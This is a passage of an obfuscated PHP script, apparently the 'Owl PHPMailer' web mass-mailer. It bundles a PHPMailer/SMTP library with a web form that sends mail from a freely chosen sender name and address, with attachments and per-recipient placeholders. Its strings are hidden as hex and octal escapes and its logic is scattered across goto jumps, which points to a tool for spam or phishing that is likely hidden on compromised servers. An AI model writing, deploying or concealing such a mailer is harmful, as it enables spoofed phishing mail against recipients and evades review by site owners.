"\141\x70\160\154\151\x63\x61\164\x69\157\x6e\x2f\x76\156\144\56\x6f\160\x65\x6e\x78\155\x6c\146\x6f\162\x6d\x61\164\163\x2d\157\x66\x66\151\143\x65\144\x6f\143\165\x6d\x65\x6e\x74\x2e\167\x6f\162\144\x70\x72\157\143\x65\x73\163\151\156\x67\x6d\154\56\x64\x6f\143\165\155\x65\x6e\164", "\x64\157\x74\x78" => "\x61\x70\x70\x6c\x69\x63\x61\164\x69\157\x6e\57\x76\156\x64\56\157\x70\x65\x6e\x78\155\x6c\x66\x6f\162\155\141\164\163\55\x6f\x66\146\x69\x63\145\144\157\143\165\x6d\x65\x6e\164\x2e\x77\x6f\x72\x64\x70\x72\157\143\145\163\163\x69\x6e\x67\155\x6c\x2e\164\x65\x6d\160\x6c\x61\x74\145", "\x78\x6c\141\x6d" => "\141\160\x70\154\151\143\141\x74\x69\157\156\x2f\166\156\144\56\155\163\x2d\x65\170\x63\145\x6c\56\141\144\x64\x69\x6e\x2e\155\141\143\162\x6f\105\x6e\141\x62\154\x65\x64\56\x31\x32", "\170\x6c\x73\142" => "\141\x70\160\154\151\143\x61\x74\x69\157\156\x2f\x76\x6e\144\x2e\x6d\163\x2d\145\x78\x63\x65\x6c\x2e\163\x68\145\x65\164\56\142\x69\x6e\141\162\171\56\x6d\141\x63\162\157\x45\x6e\141\142\x6c\145\144\56\x31\x32", "\143\x6c\x61\x73\163" => "\141\x70\x70\x6c\151\x63\141\164\151\157\156\57\x6f\143\164\145\164\x2d\163\164\x72\x65\x61\x6d", "\x64\154\x6c" => "\x61\160\x70\x6c\x69\143\x61\x74\x69\x6f\x6e\x2f\157\143\164\145\164\x2d\163\164\x72\x65\x61\x6d", "\x64\155\x73" => "\141\160\x70\154\151\x63\141\164\151\x6f\x6e\57\x6f\143\x74\145\x74\55\163\x74\162\145\141\155", "\x65\x78\145" => "\141\x70\x70\154\x69\x63\141\x74\151\157\x6e\57\157\x63\x74\x65\164\x2d\x73\164\x72\x65\141\x6d", "\154\x68\x61" => "\x61\x70\160\154\151\x63\x61\164\151\157\x6e\57\x6f\x63\x74\145\164\x2d\163\164\x72\x65\141\155", "\154\x7a\150" => "\141\160\160\x6c\x69\x63\141\164\x69\x6f\156\57\x6f\x63\x74\x65\164\x2d\x73\164\x72\x65\x61\x6d", "\x70\x73\144" => "\x61\160\x70\x6c\151\143\x61\x74\x69\157\x6e\x2f\x6f\x63\164\x65\164\55\163\x74\162\145\x61\x6d", "\x73\145\x61" => "\141\160\x70\154\151\x63\141\x74\151\157\x6e\x2f\x6f\143\164\145\164\x2d\x73\164\162\145\141\155", "\163\157" => "\141\160\x70\154\151\143\141\x74\151\x6f\156\57\157\x63\x74\x65\x74\x2d\163\164\x72\x65\141\155", "\157\144\141" => "\x61\x70\160\154\x69\x63\141\x74\x69\157\156\x2f\157\x64\x61", "\x70\x64\x66" => "\x61\160\160\154\151\143\141\164\x69\x6f\x6e\57\x70\x64\x66", "\x61\151" => "\x61\x70\x70\154\151\143\141\164\x69\157\x6e\x2f\160\157\x73\164\x73\143\162\x69\x70\x74", "\x65\160\x73" => "\141\x70\x70\x6c\151\143\x61\x74\x69\157\x6e\57\160\x6f\x73\164\x73\143\x72\x69\160\164", "\x70\x73" => "\x61\x70\x70\154\151\x63\141\x74\x69\x6f\156\57\x70\x6f\163\164\x73\143\162\151\160\164", "\x73\155\151" => "\141\160\160\154\x69\x63\141\x74\151\x6f\156\57\163\x6d\x69\x6c", "\x73\155\151\x6c" => "\x61\160\x70\x6c\x69\x63\141\164\151\157\156\x2f\163\155\x69\154", "\x6d\151\146" => "\x61\160\160\154\151\143\x61\x74\x69\157\x6e\57\x76\156\x64\x2e\155\151\x66", "\x78\x6c\x73" => "\141\160\x70\x6c\151\143\x61\x74\x69\x6f\156\57\166\x6e\x64\x2e\x6d\163\x2d\x65\x78\143\x65\x6c", "\160\160\x74" => "\x61\160\160\154\x69\143\141\164\151\157\x6e\x2f\x76\x6e\144\x2e\x6d\163\x2d\x70\x6f\167\145\162\x70\157\x69\x6e\164", "\x77\142\x78\x6d\154" => "\141\x70\x70\x6c\x69\143\x61\x74\151\x6f\x6e\x2f\x76\156\144\x2e\167\141\x70\56\167\x62\x78\155\x6c", "\x77\155\x6c\x63" => "\141\x70\160\154\x69\143\141\164\x69\157\x6e\x2f\166\x6e\x64\x2e\x77\x61\160\56\167\155\x6c\x63", "\x64\x63\162" => "\141\x70\x70\x6c\x69\143\141\x74\151\157\x6e\57\170\x2d\x64\x69\x72\145\x63\164\x6f\x72", "\144\151\162" => "\x61\160\x70\x6c\151\x63\141\164\x69\157\156\x2f\170\55\144\x69\162\145\143\x74\x6f\x72", "\x64\x78\x72" => "\x61\160\160\x6c\151\x63\x61\164\x69\157\156\57\170\55\144\x69\162\x65\x63\164\157\162", "\x64\x76\151" => "\x61\160\160\x6c\x69\143\141\164\x69\157\x6e\x2f\x78\55\x64\166\151", "\x67\164\141\162" => "\141\160\160\154\151\143\141\164\x69\x6f\156\x2f\170\x2d\147\164\141\x72", "\x70\x68\160\63" => "\141\160\x70\x6c\x69\143\x61\164\x69\x6f\x6e\57\x78\x2d\x68\164\x74\x70\x64\x2d\x70\x68\x70", "\160\x68\x70\64" => "\x61\160\x70\154\x69\x63\141\x74\151\157\x6e\57\x78\x2d\x68\x74\164\160\x64\55\160\150\160", "\x70\150\x70" => "\141\160\160\154\151\x63\x61\x74\x69\x6f\156\57\170\55\x68\164\164\x70\x64\55\160\150\x70", "\160\x68\164\155\154" => "\141\x70\160\x6c\x69\143\141\164\151\x6f\x6e\57\170\55\150\164\164\x70\x64\55\160\x68\160", "\x70\150\x70\x73" => "\141\x70\x70\x6c\151\143\x61\164\x69\157\156\57\170\55\x68\x74\x74\160\x64\x2d\160\x68\160\55\x73\x6f\165\x72\x63\x65", "\x73\x77\146" => "\141\x70\x70\154\x69\x63\x61\164\x69\157\156\57\x78\x2d\163\x68\x6f\143\153\x77\141\166\x65\55\146\154\x61\x73\x68", "\163\151\x74" => "\x61\160\160\x6c\x69\x63\x61\x74\151\157\156\57\170\55\x73\x74\x75\x66\146\151\164", "\x74\x61\162" => "\141\160\x70\x6c\x69\143\141\x74\151\x6f\156\57\170\55\164\141\162", "\164\x67\172" => "\141\160\160\154\x69\x63\x61\x74\151\157\x6e\x2f\x78\55\164\x61\162", "\170\150\x74" => "\x61\160\160\x6c\151\x63\x61\164\151\157\156\x2f\170\150\164\155\154\53\x78\155\x6c", "\x78\150\x74\155\x6c" => "\141\x70\x70\154\x69\x63\x61\x74\151\157\156\x2f\170\150\x74\155\154\53\x78\155\x6c", "\x7a\x69\160" => "\x61\160\x70\x6c\x69\143\141\164\x69\157\156\x2f\172\151\160", "\x6d\x69\144" => "\141\x75\x64\151\157\57\x6d\x69\x64\151", "\155\151\x64\x69" => "\141\x75\x64\x69\157\57\155\x69\144\151", "\x6d\160\x32" => "\141\x75\144\x69\157\57\155\x70\145\147", "\x6d\x70\63" => "\x61\165\144\151\157\57\155\x70\145\x67", "\x6d\64\141" => "\x61\x75\x64\x69\x6f\57\155\x70\64", "\x6d\160\147\x61" => "\x61\x75\x64\151\x6f\x2f\155\160\145\x67", "\141\151\x66" => "\x61\x75\144\x69\157\x2f\x78\55\141\151\x66\146", "\x61\x69\146\x63" => "\x61\165\144\x69\x6f\x2f\170\55\141\151\x66\146", "\x61\151\x66\x66" => "\141\165\144\151\157\57\x78\x2d\x61\151\x66\146", "\x72\141\155" => "\141\165\144\151\157\57\x78\x2d\160\156\55\162\x65\141\x6c\141\165\144\x69\157", "\162\155" => "\141\165\144\x69\x6f\x2f\170\x2d\x70\156\55\x72\x65\x61\154\x61\x75\144\x69\x6f", "\162\x70\155" => "\141\x75\x64\x69\157\57\x78\55\x70\x6e\55\162\x65\141\x6c\x61\x75\144\x69\x6f\x2d\160\x6c\165\147\x69\x6e", "\162\x61" => "\141\x75\144\x69\157\57\170\55\x72\145\141\154\x61\x75\x64\x69\x6f", "\x77\x61\x76" => "\x61\165\144\151\x6f\x2f\170\55\x77\x61\x76", "\155\153\x61" => "\141\x75\x64\151\157\x2f\x78\x2d\x6d\x61\x74\162\x6f\x73\x6b\x61", "\142\x6d\x70" => "\x69\155\x61\147\x65\x2f\x62\x6d\x70", "\147\151\146" => "\151\x6d\141\x67\145\57\147\x69\x66", "\152\160\145\147" => "\x69\x6d\141\x67\x65\57\152\x70\x65\147", "\x6a\160\x65" => "\151\155\x61\147\x65\57\x6a\160\x65\147", "\152\160\147" => "\x69\x6d\141\147\x65\57\x6a\x70\145\x67", "\x70\156\147" => "\x69\155\141\x67\145\x2f\160\x6e\147", "\x74\151\146\x66" => "\x69\155\141\147\145\57\x74\151\146\146", "\164\151\x66" => "\x69\155\x61\147\x65\x2f\164\151\146\x66", "\167\x65\142\160" => "\x69\155\141\x67\x65\x2f\167\145\142\x70", "\150\x65\x69\146" => "\151\x6d\x61\x67\x65\57\150\145\x69\x66", "\150\145\151\x66\x73" => "\151\155\x61\x67\x65\57\150\145\151\x66\x2d\x73\145\x71\165\x65\x6e\x63\x65", "\x68\x65\151\x63" => "\151\155\x61\x67\145\57\150\x65\151\x63", "\x68\x65\x69\143\x73" => "\151\x6d\x61\147\145\57\150\x65\x69\x63\x2d\x73\x65\x71\165\x65\156\143\145", "\x65\155\x6c" => "\x6d\145\x73\163\141\147\x65\57\x72\x66\x63\x38\x32\62", "\143\x73\x73" => "\x74\145\170\x74\x2f\143\x73\x73", "\150\164\x6d\x6c" => "\164\145\x78\x74\57\150\164\x6d\154", "\150\x74\155" => "\164\x65\x78\x74\57\x68\x74\155\x6c", "\x73\150\164\x6d\154" => "\x74\145\170\164\x2f\150\x74\155\x6c", "\154\157\x67" => "\x74\145\x78\x74\x2f\160\154\141\x69\156", "\164\145\170\164" => "\x74\145\x78\164\x2f\x70\x6c\141\151\156", "\164\x78\x74" => "\164\x65\x78\x74\x2f\x70\x6c\x61\151\156", "\162\x74\x78" => "\164\145\x78\x74\57\162\151\143\x68\x74\145\170\164", "\162\x74\x66" => "\164\x65\x78\x74\x2f\x72\x74\x66", "\x76\x63\x66" => "\x74\x65\x78\x74\57\166\x63\141\x72\144", "\x76\143\141\x72\144" => "\164\145\x78\164\57\166\143\x61\x72\x64", "\x69\143\163" => "\164\145\170\x74\x2f\143\141\x6c\x65\156\144\141\162", "\170\x6d\154" => "\x74\145\x78\164\x2f\170\x6d\154", "\x78\x73\x6c" => "\x74\x65\x78\x74\x2f\170\x6d\154", "\167\x6d\166" => "\166\151\x64\x65\x6f\57\170\55\155\163\55\x77\155\x76", "\155\160\x65\147" => "\x76\x69\x64\x65\157\57\155\x70\145\x67", "\155\x70\145" => "\166\151\144\145\157\x2f\x6d\160\x65\x67", "\155\160\x67" => "\x76\x69\x64\145\x6f\57\x6d\160\145\147", "\155\160\x34" => "\166\x69\144\145\157\x2f\x6d\160\x34", "\x6d\64\x76" => "\x76\151\144\x65\x6f\57\155\160\x34", "\155\157\x76" => "\x76\151\144\145\157\57\161\x75\x69\143\153\x74\151\155\145", "\161\x74" => "\166\x69\x64\x65\x6f\x2f\161\165\x69\143\x6b\164\151\x6d\x65", "\x72\x76" => "\166\151\x64\x65\x6f\x2f\x76\x6e\x64\x2e\x72\x6e\55\x72\x65\141\154\x76\x69\144\x65\x6f", "\x61\x76\x69" => "\x76\x69\x64\145\157\x2f\170\x2d\155\163\166\151\144\145\x6f", "\x6d\x6f\x76\151\x65" => "\166\151\x64\145\x6f\x2f\170\x2d\163\147\151\x2d\x6d\157\x76\151\x65", "\x77\145\142\x6d" => "\x76\151\144\145\157\57\x77\145\x62\x6d", "\155\153\x76" => "\166\x69\x64\x65\x6f\57\x78\x2d\155\x61\164\162\x6f\163\x6b\141"); $ext = strtolower($ext); if (array_key_exists($ext, $mimes)) { return $mimes[$ext]; } return "\x61\160\x70\154\x69\x63\141\164\151\157\156\57\x6f\x63\x74\145\164\55\163\164\162\145\x61\x6d"; } public static function filenameToType($filename) { $qpos = strpos($filename, "\x3f"); if (false !== $qpos) { $filename = substr($filename, 0, $qpos); } $ext = static::mb_pathinfo($filename, PATHINFO_EXTENSION); return static::_mime_types($ext); } public static function mb_pathinfo($path, $options = null) { $ret = array("\x64\x69\162\x6e\141\x6d\x65" => '', "\142\141\x73\x65\156\x61\155\x65" => '', "\x65\170\x74\145\x6e\163\x69\x6f\x6e" => '', "\x66\x69\x6c\145\x6e\x61\x6d\x65" => ''); $pathinfo = array(); if (preg_match("\43\136\x28\x2e\x2a\x3f\51\x5b\134\x5c\x2f\x5d\x2a\50\50\133\x5e\57\134\134\x5d\52\77\x29\x28\x5c\56\50\x5b\x5e\x5c\56\134\134\x2f\135\x2b\x3f\51\174\51\51\x5b\x5c\134\57\134\56\135\52\44\x23\151\x6d", $path, $pathinfo)) { if (array_key_exists(1, $pathinfo)) { $ret["\144\151\x72\156\x61\x6d\145"] = $pathinfo[1]; } if (array_key_exists(2, $pathinfo)) { $ret["\142\141\163\145\156\141\x6d\145"] = $pathinfo[2]; } if (array_key_exists(5, $pathinfo)) { $ret["\x65\170\x74\x65\156\x73\151\157\x6e"] = $pathinfo[5]; } if (array_key_exists(3, $pathinfo)) { $ret["\146\x69\154\145\x6e\x61\x6d\145"] = $pathinfo[3]; } } switch ($options) { case PATHINFO_DIRNAME: case "\144\x69\x72\x6e\x61\x6d\145": return $ret["\x64\x69\x72\156\x61\x6d\145"]; case PATHINFO_BASENAME: case "\142\x61\x73\145\156\141\155\x65": return $ret["\x62\141\x73\145\x6e\x61\x6d\x65"]; case PATHINFO_EXTENSION: case "\x65\x78\164\145\156\x73\151\x6f\156": return $ret["\145\x78\164\x65\156\163\151\x6f\x6e"]; case PATHINFO_FILENAME: case "\x66\151\154\145\156\141\x6d\145": return $ret["\146\x69\x6c\x65\156\x61\155\x65"]; default: return $ret; } } public function set($name, $value = '') { if (property_exists($this, $name)) { $this->{$name} = $value; return true; } $this->setError($this->lang("\166\141\x72\x69\141\142\154\x65\x5f\x73\145\164") . $name); return false; } public function secureHeader($str) { return trim(str_replace(array("\xd", "\12"), '', $str)); } public static function normalizeBreaks($text, $breaktype = null) { if (null === $breaktype) { $breaktype = static::$LE; } $text = str_replace(array("\15\xa", "\15"), "\xa", $text); if ("\12" !== $breaktype) { $text = str_replace("\12", $breaktype, $text); } return $text; } public static function getLE() { return static::$LE; } protected static function setLE($le) { static::$LE = $le; } public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '') { $this->sign_cert_file = $cert_filename; $this->sign_key_file = $key_filename; $this->sign_key_pass = $key_pass; $this->sign_extracerts_file = $extracerts_filename; } public function DKIM_QP($txt) { $line = ''; $len = strlen($txt); for ($i = 0; $i < $len; ++$i) { $ord = ord($txt[$i]); if (33 <= $ord and $ord <= 58 or $ord == 60 or 62 <= $ord and $ord <= 126) { $line .= $txt[$i]; } else { $line .= "\x3d" . sprintf("\x25\x30\x32\130", $ord); } } return $line; } public function DKIM_Sign($signHeader) { if (!defined("\x50\x4b\x43\x53\x37\137\x54\x45\130\124")) { if ($this->exceptions) { throw new Exception($this->lang("\x65\170\x74\145\156\x73\151\x6f\156\137\155\x69\x73\x73\151\156\x67") . "\157\x70\x65\x6e\x73\x73\154"); } return ''; } $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' != $this->DKIM_passphrase) { $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase); } else { $privKey = openssl_pkey_get_private($privKeyStr); } if (openssl_sign($signHeader, $signature, $privKey, "\x73\150\141\62\x35\x36\127\151\164\x68\122\x53\101\105\156\143\x72\171\x70\164\x69\157\156")) { openssl_pkey_free($privKey); return base64_encode($signature); } openssl_pkey_free($privKey); return ''; } public function DKIM_HeaderC($signHeader) { $signHeader = preg_replace("\57\134\162\x5c\x6e\x5b\40\134\164\135\x2b\57", "\40", $signHeader); $lines = explode("\xd\xa", $signHeader); foreach ($lines as $key => $line) { if (strpos($line, "\x3a") === false) { continue; } list($heading, $value) = explode("\72", $line, 2); $heading = strtolower($heading); $value = preg_replace("\x2f\133\x20\x5c\164\135\173\x32\x2c\175\57", "\x20", $value); $lines[$key] = trim($heading, "\x20\x9") . "\72" . trim($value, "\40\11"); } return implode("\15\xa", $lines); } public function DKIM_BodyC($body) { if (empty($body)) { return "\xd\xa"; } $body = static::normalizeBreaks($body, "\15\12"); return rtrim($body, "\xd\12") . "\xd\12"; } public function DKIM_Add($headers_line, $subject, $body) { $DKIMsignatureType = "\162\163\141\55\163\x68\141\x32\x35\x36"; $DKIMcanonicalization = "\x72\x65\154\x61\x78\x65\144\x2f\x73\151\x6d\x70\x6c\x65"; $DKIMquery = "\x64\x6e\163\57\164\x78\164"; $DKIMtime = time(); $subject_header = "\x53\x75\x62\152\145\x63\164\72\x20{$subject}"; $headers = explode(static::$LE, $headers_line); $from_header = ''; $to_header = ''; $date_header = ''; $current = ''; $copiedHeaderFields = ''; $foundExtraHeaders = array(); $extraHeaderKeys = ''; $extraHeaderValues = ''; $extraCopyHeaderFields = ''; foreach ($headers as $header) { if (strpos($header, "\106\162\x6f\155\72") === 0) { $from_header = $header; $current = "\146\162\x6f\x6d\137\x68\x65\x61\x64\x65\x72"; } elseif (strpos($header, "\x54\157\x3a") === 0) { $to_header = $header; $current = "\164\x6f\137\150\x65\141\x64\x65\x72"; } elseif (strpos($header, "\x44\x61\164\x65\x3a") === 0) { $date_header = $header; $current = "\x64\141\x74\145\x5f\x68\145\141\144\x65\x72"; } elseif (!empty($this->DKIM_extraHeaders)) { foreach ($this->DKIM_extraHeaders as $extraHeader) { if (strpos($header, $extraHeader . "\72") === 0) { $headerValue = $header; foreach ($this->CustomHeader as $customHeader) { if ($customHeader[0] === $extraHeader) { $headerValue = trim($customHeader[0]) . "\72\x20" . $this->encodeHeader(trim($customHeader[1])); break; } } $foundExtraHeaders[$extraHeader] = $headerValue; $current = ''; break; } } } else { if (!empty(${$current}) and strpos($header, "\40\75\77") === 0) { ${$current} .= $header; } else { $current = ''; } } } foreach ($foundExtraHeaders as $key => $value) { $extraHeaderKeys .= "\72" . $key; $extraHeaderValues .= $value . "\15\xa"; if ($this->DKIM_copyHeaderFields) { $extraCopyHeaderFields .= "\11\174" . str_replace("\x7c", "\75\67\103", $this->DKIM_QP($value)) . "\x3b\xd\12"; } } if ($this->DKIM_copyHeaderFields) { $from = str_replace("\174", "\x3d\67\103", $this->DKIM_QP($from_header)); $to = str_replace("\174", "\75\67\103", $this->DKIM_QP($to_header)); $date = str_replace("\174", "\75\67\103", $this->DKIM_QP($date_header)); $subject = str_replace("\174", "\x3d\67\103", $this->DKIM_QP($subject_header)); $copiedHeaderFields = "\11\172\x3d{$from}\15\xa" . "\11\x7c{$to}\xd\xa" . "\11\174{$date}\15\xa" . "\x9\174{$subject}\73\15\12" . $extraCopyHeaderFields; } $body = $this->DKIM_BodyC($body); $DKIMlen = strlen($body); $DKIMb64 = base64_encode(pack("\110\x2a", hash("\x73\150\x61\x32\65\x36", $body))); if ('' == $this->DKIM_identity) { $ident = ''; } else { $ident = "\x20\151\x3d" . $this->DKIM_identity . "\73"; } $dkimhdrs = "\104\x4b\111\115\55\x53\x69\x67\x6e\x61\x74\x75\162\x65\72\40\166\75\61\x3b\40\141\75" . $DKIMsignatureType . "\x3b\40\161\x3d" . $DKIMquery . "\x3b\x20\154\x3d" . $DKIMlen . "\x3b\x20\163\75" . $this->DKIM_selector . "\73\15\xa" . "\11\164\x3d" . $DKIMtime . "\x3b\x20\143\75" . $DKIMcanonicalization . "\73\15\12" . "\11\150\x3d\106\x72\x6f\155\72\124\x6f\72\x44\141\x74\x65\72\x53\x75\142\x6a\145\x63\x74" . $extraHeaderKeys . "\x3b\xd\12" . "\11\144\x3d" . $this->DKIM_domain . "\x3b" . $ident . "\xd\xa" . $copiedHeaderFields . "\x9\x62\x68\75" . $DKIMb64 . "\73\15\12" . "\11\x62\x3d"; $toSign = $this->DKIM_HeaderC($from_header . "\xd\12" . $to_header . "\15\xa" . $date_header . "\xd\xa" . $subject_header . "\xd\xa" . $extraHeaderValues . $dkimhdrs); $signed = $this->DKIM_Sign($toSign); return static::normalizeBreaks($dkimhdrs . $signed) . static::$LE; } public static function hasLineLongerThanMax($str) { return (bool) preg_match("\x2f\x5e\x28\x2e\173" . (self::MAX_LINE_LENGTH + strlen(static::$LE)) . "\x2c\x7d\x29\x2f\155", $str); } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from, $extra) { if (!empty($this->action_function) and is_callable($this->action_function)) { call_user_func($this->action_function, $isSent, $to, $cc, $bcc, $subject, $body, $from, $extra); } } public function getOAuth() { return $this->oauth; } public function setOAuth(OAuth $oauth) { $this->oauth = $oauth; } } goto twX24; sgTAS: ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE = edge">
  <meta name="viewport" content="width = device-width, initial-scale = 1">
  <title>Owl PHP*Mailer* <?php  goto yfgWE; fn9da: function processEmailSendingRequest() { if (!is_email($GLOBALS["\162\x65\x63\151\x70\x69\145\x6e\164"])) { die("\x49\x6e\x63\x6f\162\x72\x65\x63\x74\40\x45\x6d\x61\x69\x6c"); } $mail = setSendingMethod(); $fromEmail = owlClear($GLOBALS["\163\145\x6e\144\145\x72\105\155\x61\x69\154"], $GLOBALS["\x72\145\x63\151\x70\x69\x65\x6e\x74"]); $fromName = owlClear($GLOBALS["\163\145\x6e\144\x65\162\x4e\141\155\x65"], $GLOBALS["\162\145\x63\151\160\151\145\x6e\x74"]); $replyTo = owlClear($GLOBALS["\x72\x65\160\x6c\x79\124\x6f"], $GLOBALS["\162\x65\143\151\160\151\145\x6e\164"]); $recipient = $GLOBALS["\x72\x65\143\x69\160\x69\x65\156\164"]; $subject = owlClear($GLOBALS["\x6d\x65\163\x73\141\147\x65\x53\165\x62\152\x65\143\164"], $GLOBALS["\162\145\x63\151\160\151\145\156\164"]); $body = owlClear($GLOBALS["\155\x65\163\163\x61\147\x65\114\145\164\x74\145\x72"], $GLOBALS["\x72\x65\143\x69\x70\151\x65\x6e\x74"]); $altBody = owlClear($GLOBALS["\141\x6c\x74\x4d\145\163\x73\141\147\x65\114\x65\164\x74\x65\162"], $GLOBALS["\x72\x65\x63\x69\160\x69\x65\156\x74"]); $charSet = $GLOBALS["\145\156\x63\x6f\144\151\156\x67\124\171\x70\145"]; $messageType = $GLOBALS["\155\145\163\x73\141\147\x65\124\x79\160\x65"]; $emailPriority = $GLOBALS["\x65\x6d\141\151\x6c\x50\162\x69\157\162\151\x74\x79"]; $mail->setFrom($fromEmail, $fromName); if (isset($replyTo) && $replyTo !== '') { $mail->addReplyTo($replyTo); } $mail->addAddress($recipient); if (isset($subject) && $subject !== '') { $mail->Subject = $subject; } if (isset($body) && $body !== '') { $mail->Body = $body; } if (isset($charSet) && $charSet !== '') { $mail->CharSet = $charSet; } if (isset($emailPriority) && $emailPriority !== '') { $mail->Priority = $emailPriority; } if (isset($altBody) && $altBody !== '') { $mail->AltBody = $altBody; } if (isset($_FILES["\141\164\164\141\x63\150\155\145\x6e\x74"])) { for ($i = 0; $i < count($_FILES["\141\x74\x74\x61\x63\150\155\x65\x6e\x74"]["\x6e\141\155\145"]); $i++) { if ($_FILES["\x61\164\164\141\143\150\155\145\x6e\x74"]["\x74\155\160\x5f\156\141\155\x65"][$i] != '') { $mail->AddAttachment($_FILES["\141\164\x74\x61\143\150\155\145\x6e\164"]["\164\155\x70\x5f\x6e\x61\x6d\x65"][$i], $_FILES["\141\x74\x74\x61\x63\x68\x6d\x65\x6e\164"]["\156\141\155\145"][$i]); } } } if ($messageType == "\150\x74\x6d\154") { $mail->IsHTML(true); } else { $mail->IsHTML(false); } if (!$mail->send()) { die($mail->ErrorInfo); } else { die("\x4f\x4b"); } } goto XqBEz; wV1yi: ?>
</b></li>

            </ul>
            <h4>HELP</h4>
            <ul>
                <li>[-email-] : <b>Reciver Email</b></li>
                <li>[-time-] : <b>Date and Time</b> (<?php  goto QZ5_q; Zplg0: echo $owl["\x77\145\x62\163\151\x74\x65"]; goto GB6z3; QZ5_q: echo date("\x6d\57\144\x2f\131\x20\x68\x3a\x69\x3a\163\40\141", time()); goto aG_Wj; twX24: class SMTP { const VERSION = "\66\56\x30\56\67"; const LE = "\15\12"; const DEFAULT_PORT = 25; const MAX_LINE_LENGTH = 998; const DEBUG_OFF = 0; const DEBUG_CLIENT = 1; const DEBUG_SERVER = 2; const DEBUG_CONNECTION = 3; const DEBUG_LOWLEVEL = 4; public $do_debug = self::DEBUG_OFF; public $Debugoutput = "\145\143\150\157"; public $do_verp = false; public $Timeout = 300; public $Timelimit = 300; protected $smtp_transaction_id_patterns = array("\145\x78\x69\155" => "\57\133\x5c\x64\x5d\173\x33\x7d\40\117\x4b\x20\x69\144\75\50\x2e\52\x29\x2f", "\163\x65\x6e\144\x6d\x61\151\x6c" => "\x2f\x5b\134\x64\x5d\173\63\x7d\40\x32\56\60\x2e\x30\40\50\x2e\x2a\x29\x20\x4d\x65\x73\163\x61\x67\x65\x2f", "\x70\x6f\x73\164\146\x69\x78" => "\57\133\134\144\135\173\x33\175\x20\x32\56\x30\x2e\60\x20\117\153\72\40\x71\x75\x65\x75\145\x64\40\141\163\40\50\x2e\52\51\57", "\x4d\x69\143\x72\x6f\163\x6f\146\164\137\105\x53\x4d\124\120" => "\57\133\x30\55\x39\x5d\173\63\175\40\x32\56\x5b\134\x64\x5d\x2e\x30\x20\x28\x2e\52\51\x40\x28\x3f\x3a\x2e\x2a\x29\x20\x51\165\145\165\x65\x64\40\x6d\x61\x69\154\x20\146\157\162\40\144\x65\x6c\x69\x76\145\x72\x79\x2f", "\101\x6d\141\172\x6f\x6e\x5f\123\x45\123" => "\57\x5b\x5c\x64\135\173\x33\175\x20\x4f\153\40\x28\x2e\x2a\x29\57", "\123\x65\156\144\x47\162\151\144" => "\x2f\133\134\x64\135\173\x33\x7d\x20\x4f\x6b\72\40\x71\165\x65\165\x65\x64\40\141\x73\40\x28\56\52\x29\57", "\x43\141\155\160\141\151\147\x6e\x4d\157\156\x69\164\x6f\x72" => "\57\x5b\134\144\135\173\x33\x7d\x20\62\56\60\56\60\x20\117\113\x3a\50\x5b\x61\x2d\172\101\55\132\x5c\x64\x5d\x7b\64\x38\175\51\x2f"); protected $last_smtp_transaction_id; protected $smtp_conn; protected $error = array("\145\x72\162\157\162" => '', "\x64\x65\x74\141\151\x6c" => '', "\163\155\x74\160\137\143\x6f\x64\145" => '', "\x73\155\164\x70\137\143\x6f\x64\145\137\x65\170" => ''); protected $helo_rply = null; protected $server_caps = null; protected $last_reply = ''; protected function edebug($str, $level = 0) { if ($level > $this->do_debug) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($str); return; } if (!in_array($this->Debugoutput, array("\145\162\x72\x6f\x72\x5f\x6c\x6f\x67", "\x68\x74\155\154", "\x65\143\x68\157")) and is_callable($this->Debugoutput)) { call_user_func($this->Debugoutput, $str, $level); return; } switch ($this->Debugoutput) { case "\145\x72\x72\157\x72\137\154\x6f\x67": error_log($str); break; case "\x68\x74\155\154": echo gmdate("\131\55\155\x2d\x64\40\x48\x3a\151\x3a\163"), "\40", htmlentities(preg_replace("\x2f\133\134\162\x5c\x6e\135\53\x2f", '', $str), ENT_QUOTES, "\x55\124\106\x2d\x38"), "\x3c\x62\x72\76\12"; break; case "\145\x63\x68\157": default: $str = preg_replace("\57\134\162\134\156\x7c\x5c\162\57\x6d\x73", "\12", $str); echo gmdate("\x59\55\x6d\55\144\x20\x48\x3a\151\72\x73"), "\x9", trim(str_replace("\xa", "\xa\x20\x20\x20\x20\x20\x20\x20\40\40\x20\x20\x20\x20\40\x20\x20\40\40\40\11\40\40\x20\x20\x20\40\x20\40\40\x20\40\x20\x20\40\x20\x20\x20\40", trim($str))), "\12"; } } public function connect($host, $port = null, $timeout = 30, $options = array()) { static $streamok; if (null === $streamok) { $streamok = function_exists("\163\x74\x72\x65\x61\155\137\163\157\143\153\x65\164\137\x63\154\x69\x65\x6e\x74"); } $this->setError(''); if ($this->connected()) { $this->setError("\x41\x6c\162\x65\141\144\x79\40\143\x6f\x6e\x6e\x65\143\164\x65\x64\x20\x74\157\40\x61\x20\x73\x65\x72\x76\x65\162"); return false; } if (empty($port)) { $port = self::DEFAULT_PORT; } $this->edebug("\103\x6f\156\x6e\x65\143\164\x69\157\156\x3a\40\x6f\160\145\156\151\156\147\40\x74\x6f\40{$host}\x3a{$port}\x2c\40\164\151\x6d\145\x6f\x75\x74\75{$timeout}\54\40\157\x70\164\151\157\156\x73\75" . (count($options) > 0 ? var_export($options, true) : "\141\162\x72\x61\x79\50\51"), self::DEBUG_CONNECTION); $errno = 0; $errstr = ''; if ($streamok) { $socket_context = stream_context_create($options); set_error_handler(array($this, "\145\x72\x72\157\162\110\x61\156\144\x6c\x65\x72")); $this->smtp_conn = stream_socket_client($host . "\72" . $port, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $socket_context); restore_error_handler(); } else { 